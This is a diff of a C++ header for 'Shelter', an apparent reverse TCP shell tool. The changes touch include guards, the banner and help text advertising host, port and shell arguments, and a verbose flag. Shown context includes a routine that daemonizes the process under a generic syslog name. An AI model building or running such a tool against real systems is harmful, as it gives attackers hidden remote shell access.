@@ -1,17 +1,19 @@
+#ifndef SHELTER_HPP
+#define SHELTER_HPP
+
 #include <iostream>
 #include <stdlib.h>
 #include <unistd.h>
 #include <netinet/in.h>
+#include <arpa/inet.h>
 #include <sys/types.h>
 #include <sys/socket.h>
-#include <arpa/inet.h>
 #include <sys/stat.h>
 #include <syslog.h>
-#include <argh.h>
 #include <string>
-#include <boost/lexical_cast.hpp>
 
 using std::string;
+using std::vector;
 using std::cout;
 using std::cerr;
 using std::endl;
@@ -19,6 +21,7 @@ using std::endl;
 
 class Shelter {
     public:
+        bool verbose = false;
 
         void showBanner()
         {
@@ -38,19 +41,19 @@ class Shelter {
     \/  .__    ;    \   `-.     
      ;     "-,/_..--"`-..__)    
      '""--.._:
-
+<Cvar1984@BHSec>
 )";
         }
 
         void showHelp()
         {
-            cout << "desc:\t Reverse TCP Connection" << endl;
-            cout << "flag:\t -r, --reverse:" << endl;
-            cout << "arg:\t -H <str>host -P <int>port" << endl;
             cout << "----------" << endl;
-            cout << "desc:\t Verbose process" << endl;
-            cout << "flag:\t -v, --verbose:" << endl;
-            cout << "arg:\t -v <int>level" << endl;
+            cout << "desc\t:\t Reverse TCP Connection" << endl;
+            cout << "flag\t:\t -r, --reverse:" << endl;
+            cout << "arg\t:\t -h host -p port -s shell" << endl;
+            cout << "----------" << endl;
+            cout << "desc\t:\t Verbose process" << endl;
+            cout << "flag\t:\t -v, --verbose:" << endl;
             cout << "----------" << endl;
         }
 
@@ -59,11 +62,11 @@ class Shelter {
             int s;
             pid_t pid, sid;
             pid = fork();
-            
+
             if(pid > 0) exit(EXIT_SUCCESS);
             else if(pid < 0) exit(EXIT_FAILURE);
             umask(0);
-           
+
             // Open system logs for the child process
             openlog("daemon-named", LOG_NOWAIT | LOG_PID, LOG_USER);
             syslog(LOG_NOTICE, "Successfully started daemon-name");
@@ -108,3 +111,4 @@ class Shelter {
             exit(EXIT_SUCCESS);
         }
 };
+#endif
